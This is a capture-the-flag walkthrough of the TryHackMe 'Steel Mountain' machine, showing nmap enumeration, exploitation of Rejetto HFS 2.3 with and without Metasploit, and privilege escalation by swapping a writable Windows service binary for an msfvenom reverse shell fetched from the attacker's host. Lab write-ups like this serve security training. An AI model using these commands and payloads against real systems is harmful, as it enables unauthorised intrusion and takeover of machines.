# **[Steel Mountain](https://tryhackme.com/room/steelmountain)**

<br />

> Evan Diamantidis | June 20th, 2022

<br />

# Table of contents

### [1. Scan and enumeration](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Machines/Steel%20Mountain#1-scan-and-enumeration-1)

### [2. Initial access using Metasploit](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Machines/Steel%20Mountain#2-initial-access-using-metasploit-1)

### [3. Privilege escalation using Metasploit](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Machines/Steel%20Mountain#3-privilege-escalation-using-metasploit-1)

### [4. Initial access without Metasploit](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Machines/Steel%20Mountain#4-initial-access-without-metasploit-1)

### [5. Privilege escalation without Metasploit](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Machines/Steel%20Mountain#5-privilege-escalation-without-metasploit-1)


<br />
<br />

## 1. Scan and enumeration

<br />

Perform an initial scan with `nmap` to enumerate the target for open ports and available services.

```
# Nmap 7.92 scan initiated Mon Jun 20 20:45:26 2022 as: nmap -sC -sV -A -oN nmap/initial 10.10.156.92
Nmap scan report for 10.10.156.92
Host is up (0.012s latency).
Not shown: 989 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/8.5
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2022-06-20T19:46:50+00:00
|_ssl-date: 2022-06-20T19:46:55+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2022-06-19T19:39:11
|_Not valid after:  2022-12-19T19:39:11
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=6/20%OT=80%CT=1%CU=43581%PV=Y%DS=2%DC=T%G=Y%TM=62B0CEA
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=
OS:7)OPS(O1=M505NW8ST11%O2=M505NW8ST11%O3=M505NW8NNT11%O4=M505NW8ST11%O5=M5
OS:05NW8ST11%O6=M505ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M505NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%
OS:T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:81:8f:5c:65:2b (unknown)
| smb2-time: 
|   date: 2022-06-20T19:46:49
|_  start_date: 2022-06-20T19:39:02
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1s, deviation: 0s, median: 0s

TRACEROUTE (using port 1025/tcp)
HOP RTT     ADDRESS
1   7.71 ms 10.8.0.1
2   7.87 ms 10.10.156.92

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 20 20:46:53 2022 -- 1 IP address (1 host up) scanned in 87.09 seconds
```

<br />

Here is the information we gathered:

- 80/tcp | ftp - `Microsoft IIS httpd 8.5`

- 135/tcp | msrpc `Microsoft Windows RPC`

- 139/tcp | netbios-ssn `Microsoft Windows netbios-ssn`

- 445/tcp | microsoft-ds `Microsoft Windows Server 2008 R2 - 2012 microsoft-ds`

- 8080/tcp | http `HttpFileServer httpd 2.3`

<br />

The employee of the month can easily be found by visiting the web page of this machine.

![image](https://user-images.githubusercontent.com/14150485/174669753-65d30e4b-d38e-47b4-93b6-f7ac29be9111.png)

If you are a Mr. Robot fan you will most likely have the answer as soon as you land on the page. If not, feel free to inspect the image to get the name - Then make sure you watch Mr. Robot, the show really is one of a kind!

<br />

**Please note that the next couple of sections in this walkthrough demonstrate how to root the machine using Metasploit. If you are looking for a bit of a challenge without it feel free to jump to [4. Initial access without Metasploit](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Machines/Steel%20Mountain#4-initial-access-without-metasploit-1) for a (mostly) manual exploitation.**

<br />
<br />


## 2. Initial access using Metasploit

<br />

Visit the secondary web page on port `8080` on a browser to get the server details by clicking the link under the `server information` area to the left, the exploit for which can be found on [Exploit Database](https://www.exploit-db.com/).

Since we will be using Metasploit for this step, the initial access should be pretty straightforward once we update the relevant `RHOSTS`, `RPORT` and `LHOST` options for this module in the `msfconsole` and run the exploit - Please note that this might take a couple of minutes to complete.

Once complete, the flag for this step can be found on the user's desktop folder.

```
meterpreter > pwd
C:\users\****\Desktop
meterpreter > ls
Listing: C:\users\****\Desktop
==============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2019-09-27 12:07:07 +0100  desktop.ini
100666/rw-rw-rw-  70    fil   2019-09-27 13:42:38 +0100  user.txt

meterpreter > cat user.txt 
***************fcd7c**********d**5
```

<br />
<br />

## 3. Privilege escalation using Metasploit

<br />

Follow along with the instructions and download the [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) script that we can place on the target via our `meterpreter` shell.

```
meterpreter > upload /root/TryHackMe/Machines/Steel\ Mountain/PowerUp.ps1
[*] uploading  : /root/TryHackMe/Machines/Steel Mountain/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /root/TryHackMe/Machines/Steel Mountain/PowerUp.ps1 -> PowerUp.ps1
[*] uploaded   : /root/TryHackMe/Machines/Steel Mountain/PowerUp.ps1 -> PowerUp.ps1
```

<br />

Before running the script make sure to load the `powershell` extension in `meterpreter` and initialize it to successfully enumerate the box.

```
meterpreter > load powershell 
Loading extension powershell...Success.
meterpreter > powershell_shell 
                
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
```

<br />

Reading through the information we obtained from the script we notice an unquoted service path vulnerability with `WriteAttributes` permissions and a `True` value for `CanRestart`, which means we can stop and replace this service on the target machine with a reverse shell, then restart it to gain root access.

Let's follow the instructions and create a payload locally that we will use to replace this service.

```
╭─root@kali ~/TryHackMe/Machines/Steel Mountain  
╰─➤  msfvenom -p windows/shell_reverse_tcp LHOST=LOCAL_HOST LPORT=LOCAL_PORT -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe-service file: 15872 bytes
Saved as: ASCService.exe
```

<br />

Set up an active `netcat` listener locally using the same local port value we assigned to the `msfvenom` payload.

```
nc -lvnp LOCAL_PORT
```

<br />

Now stop the running service on the target and replace it with the payload we created. 

```
meterpreter > cd C:\\Program\ Files\ (x86)\\IObit\\Advanced\ SystemCare\\
meterpreter > upload /root/TryHackMe/Machines/Steel\ Mountain/ASCService.exe
[*] uploading  : /root/TryHackMe/Machines/Steel Mountain/ASCService.exe -> ASCService.exe
[*] Uploaded 15.50 KiB of 15.50 KiB (100.0%): /root/TryHackMe/Machines/Steel Mountain/ASCService.exe -> ASCService.exe
[*] uploaded   : /root/TryHackMe/Machines/Steel Mountain/ASCService.exe -> ASCService.exe
meterpreter > shell
Process 2968 created.
Channel 6 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\IObit\Advanced SystemCare>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        
C:\Program Files (x86)\IObit\Advanced SystemCare>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 144
        FLAGS              :
```

<br />

Once the connection has been established with our listener we can navigate to this user's desktop directory to get the flag.

```
╭─root@kali ~  
╰─➤  nc -lvnp 4443         
listening on [any] 4443 ...
connect to [10.8.76.102] from (UNKNOWN) [10.10.156.92] 49343
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd c:\Users\Administrator\Desktop
cd c:\Users\Administrator\Desktop

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of c:\Users\Administrator\Desktop

10/12/2020  12:05 PM    <DIR>          .
10/12/2020  12:05 PM    <DIR>          ..
10/12/2020  12:05 PM             1,528 activation.ps1
09/27/2019  05:41 AM                32 root.txt
               2 File(s)          1,560 bytes
               2 Dir(s)  44,170,854,400 bytes free

c:\Users\Administrator\Desktop>more root.txt    
more root.txt
9af5**********7c00f**********d***
```

<br />

We just pwned Steel Mountain using Metasploit!

<br />
<br />

### 4. Initial access without Metasploit

<br />

Now for a manual approach to rooting this machine - This section should be particularly useful as a basic refresher to anyone preparing for the OSCP exam, which does not allow the use of Metasploit.

Navigate to [Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)](https://www.exploit-db.com/exploits/39161/) and download a copy of this exploit, as we will be using this to gain initial access to the target after updating the `ip_addr` and `local_port` values with our local IP and port values.

As mentioned in the task, this will only work having both an active `netcat` listener and a web server running at the same time and from the same location.

Start a `netcat` listener on the port number specified on the exploit. Then, proceed to copy the `nc.exe` file located in `/usr/share/windows-resources/binaries/` to your preferred location and start a `python` server listening on port 80 from that same directory. When all set, execute the exploit script twice and the connection will be established with our `netcat` listener.

![image](https://user-images.githubusercontent.com/14150485/174684756-c6560791-0f1c-4630-97e5-9cf10b8faeda.png)

<br />

Grab a copy of [WinPEAS.exe](https://github.com/carlospolop/PEASS-ng/releases) that we can use to upload to the target machine, then proceed to place it on the desktop folder of the current user.

```
C:\Users\bill\Desktop>powershell -c wget "http://LOCAL_IP:80/winPEAS.exe" -outfile "winpeas.exe"
powershell -c wget "http://LOCAL_IP:80/winPEAS.exe" -outfile "winpeas.exe"

C:\Users\bill\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\bill\Desktop

06/20/2022  04:43 PM    <DIR>          .
06/20/2022  04:43 PM    <DIR>          ..
09/27/2019  05:42 AM                70 user.txt
06/20/2022  04:43 PM         1,936,896 winpeas.exe
               2 File(s)      1,936,966 bytes
               2 Dir(s)  44,209,725,440 bytes free
```

<br />

Since we are on the desktop folder we can quickly get the flag for the first challenge before we proceed with the next steps.

```
C:\Users\bill\Desktop>more user.txt
more user.txt
***************fcd7c**********d**5
```

<br />

The results from `WinPEAS` reveal a list of vulnerable services that we could potentially exploit, the first of which seems to allow our user to create files and write data in the service directory.

![image](https://user-images.githubusercontent.com/14150485/174689954-67058ed2-d09c-48f9-bd2b-5abf480500a8.png)

<br />

We can further investigate this service from its parent directory to see if we can manually interact with it, as well as write over it - Should that be the case, we can replace it to escalate our privileges.

```
C:\Program Files (x86)\IObit>sc qc AdvancedSystemCareService9
sc qc AdvancedSystemCareService9
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AdvancedSystemCareService9
        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
        LOAD_ORDER_GROUP   : System Reserved
        TAG                : 1
        DISPLAY_NAME       : Advanced SystemCare Service 9
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

C:\Program Files (x86)\IObit>icacls "Advanced SystemCare"
icacls "Advanced SystemCare"
Advanced SystemCare STEELMOUNTAIN\bill:(I)(OI)(CI)(RX,W)
                    NT SERVICE\TrustedInstaller:(I)(F)
                    NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                    NT AUTHORITY\SYSTEM:(I)(F)
                    NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                    BUILTIN\Users:(I)(RX)
                    BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                    CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                    APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                    APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files
```

<br />

Looks like this is indeed an interactive service and our user has read, write and execute permissions on the containing folder, meaning we can proceed to replace it with a reverse shell and restart it.

<br />
<br />

## 5. Privilege escalation without Metasploit

<br />

Create a Windows reverse shell payload using `msfvenom` as instructed in Task 3.

```
msfvenom -p windows/shell_reverse_tcp LHOST=LOCAL_IP LPORT=LOCAL_PORT -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
```

<br />

Use the relevant `sc` command, also provided on the task, to stop the service on the target machine.

```
C:\Program Files (x86)\IObit\Advanced SystemCare>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

<br />

Transfer the reverse shell to the target via the `python` server we used to connect to this machine earlier if it is still running in the background, otherwise go ahead an set up a temporary one again.

```
C:\Program Files (x86)\IObit\Advanced SystemCare>powershell -c wget "http://LOCAL_IP:80/ASCService.exe" -outfile "ASCService.exe"
powershell -c wget "http://LOCAL_IP:80/ASCService.exe" -outfile "ASCService.exe"

C:\Program Files (x86)\IObit\Advanced SystemCare>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2588
        FLAGS              :
```

<br />

The next step is to ensure we set up a `netcat` listening to the port number specified on the reverse shell.

```
nc -lvnp LOCAL_PORT
```

<br />

Now start the service to establish a connection with our target machine.

```
C:\Program Files (x86)\IObit\Advanced SystemCare>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2588
        FLAGS              :
```

<br />

The flag to complete this room is located on this user's desktop folder.

```
C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd \users\administrator\desktop
cd \users\administrator\desktop

C:\Users\Administrator\Desktop>dir 
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\Administrator\Desktop

10/12/2020  12:05 PM    <DIR>          .
10/12/2020  12:05 PM    <DIR>          ..
10/12/2020  12:05 PM             1,528 activation.ps1
09/27/2019  05:41 AM                32 root.txt
               2 File(s)          1,560 bytes
               2 Dir(s)  44,153,712,640 bytes free

C:\Users\Administrator\Desktop>more root.txt
more root.txt
9af5**********7c00f**********d***
```

<br />

We just pwned Steel Mountain manually!

<br />
